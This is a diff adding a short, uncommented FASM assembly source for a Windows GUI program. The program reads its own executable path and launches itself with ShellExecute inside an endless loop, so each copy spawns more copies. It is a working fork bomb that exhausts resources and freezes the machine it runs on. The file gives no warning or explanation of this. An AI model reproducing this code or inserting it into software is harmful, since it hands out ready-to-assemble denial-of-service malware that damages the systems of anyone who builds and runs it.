@@ -1,0 +1,36 @@
+format PE GUI 4.0
+entry start
+section '.text' code readable executable
+  start:
+        pushd 1000
+        pushd path
+        pushd 0
+        call [GetModuleFileName]
+   @@:
+        pushd 1
+        pushd 0
+        pushd 0
+        pushd path
+        pushd command
+        pushd 0
+        call [ShellExecute]
+        jmp @b
+section '.data' data readable writeable
+  path rb 1000
+  command db "open"
+section '.idata' import data readable writeable
+  dd 0,0,0,RVA kernel32id,RVA kernel32
+  dd 0,0,0,RVA shell32id,RVA shell32
+  kernel32:
+    GetModuleFileName dd RVA _GetModuleFileName
+    dd 0
+  shell32:
+    ShellExecute dd RVA _ShellExecute
+    dd 0
+  kernel32id db 'kernel32.dll',0
+  shell32id db 'shell32.dll',0
+  _GetModuleFileName dw 0
+    db 'GetModuleFileNameA',0
+  _ShellExecute dw 0
+    db 'ShellExecuteA',0
+section '.reloc' fixups data readable discardable
